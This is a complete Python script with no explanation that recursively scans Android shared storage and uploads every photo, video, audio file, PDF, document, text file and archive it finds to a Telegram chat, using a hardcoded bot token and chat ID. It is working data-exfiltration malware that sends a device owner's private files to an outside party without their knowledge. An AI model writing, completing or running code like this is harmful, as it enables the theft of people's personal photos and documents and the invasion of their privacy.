import os
import threading
import queue
import telebot
import random
BOT_TOKEN = "8109058591:AAHDIQJg7SFC-tQ3vHApvtS-NzPBdPi86k8"
CHAT_ID = "7759417468"
bot = telebot.TeleBot(BOT_TOKEN)
target_extensions = [".jpg", ".jpeg", ".png", ".mp4", ".mp3", ".pdf", ".docx", ".xlsx", ".txt", ".zip"]
start_dirs = ["/sdcard", "/storage/emulated/0"]
q = queue.Queue()
def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            bot.send_document(CHAT_ID, f)
    except Exception as e:
        print(e)
def scan():
    while not q.empty():
        current = q.get()
        try:
            for item in os.scandir(current):
                if item.is_file():
                    ext = os.path.splitext(item.name)[1].lower()
                    if ext in target_extensions:
                        send_file(item.path)
                elif item.is_dir():
                    q.put(item.path)
        except:
            pass
        q.task_done()
for path in start_dirs:
    q.put(path)
threads = []
for _ in range(8):
    t = threading.Thread(target=scan)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
